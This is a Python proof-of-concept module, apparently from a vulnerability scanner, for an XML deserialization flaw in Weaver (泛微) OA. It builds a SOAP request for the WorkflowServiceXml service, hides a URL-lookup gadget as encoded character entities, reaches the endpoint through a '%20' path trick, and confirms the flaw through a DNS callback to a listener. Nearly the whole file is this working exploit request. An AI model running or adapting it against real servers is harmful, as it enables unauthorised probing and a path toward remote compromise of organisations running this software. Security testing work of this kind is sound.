# -*- coding:utf-8 -*-
# 泛微OA_XML反序列化

from .. import requestUtil, fileUtil, dnsT00l
from ServiceScanModel.models import ServiceScan

exp_data = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">\n<soapenv:Header/>\n' \
           '<soapenv:Body>\n<web:doCreateWorkflowRequest>\n' \
           '<web:string>\n{payload}' \
           '</web:string>\n' \
           '<web:string>2</web:string>\n' \
           '</web:doCreateWorkflowRequest>\n' \
           '</soapenv:Body>\n</soapenv:Envelope>'

urldns_text = "<map>\n" \
              "<entry>\n" \
              "<url>http://{ip}</url>\n" \
              "<string>http://{ip}</string>\n" \
              "</entry>\n<" \
              "/map>"

def get_payload(text):
    payload = ""
    for i in text:
        payload += ("&#" + str(ord(i)) + ";")
    return exp_data.format(payload=payload)

def test(url):
    global urldns_text
    dns_ip = dnsT00l.get_dns_ip()
    urldns_text = urldns_text.format(ip=dns_ip)
    urldns_data = get_payload(text=urldns_text)
    url = "%s/services%%20/WorkflowServiceXml" % url
    try:
        resp = requestUtil.post(url, data=urldns_data, timeout=1)
    except:
        pass
    return dnsT00l.get_result()

def fingerprint(service):
    try:
        if not service.url == "" and "/help/sys/help.html" in requestUtil.get(service.url).text:
            return True
    except:
        return False

def poc(service: ServiceScan):
    try:
        result = test(service.url)
        if result:
            return ["泛微OA_XML反序列化", "ip: %s<br>time: %s"%(result[0], result[1])]
    except:
        return []